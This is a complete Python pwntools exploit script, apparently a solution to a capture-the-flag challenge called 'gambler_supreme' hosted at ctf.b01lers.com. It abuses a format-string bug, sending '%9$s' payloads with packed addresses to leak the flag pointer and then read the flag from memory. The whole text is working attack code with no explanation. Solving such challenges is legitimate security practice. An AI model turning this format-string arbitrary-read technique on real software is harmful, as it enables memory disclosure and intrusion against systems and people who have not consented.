#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./gambler_supreme', checksec=False)

if args.REMOTE:
	p = remote('ctf.b01lers.com', 9201)
else:
	p = process(binary.path)

p.sendlineafter(b': ',b'1')

payload  = b''
payload += b'%9$s----'
payload += p64(binary.sym.flag)

p.sendlineafter(b'letters: ',payload)
p.recvuntil(b'guess: ')
_ = p.recvuntil(b'----')[:-4]
flag = u64(_ + (8 - len(_)) * b'\0')

payload  = b''
payload += b'%00009$s'
payload += p64(flag)

p.sendlineafter(b'letters: ',payload)
p.recvuntil(b'guess: ')
_ = p.recvline().strip().decode()
p.close()
print(_)

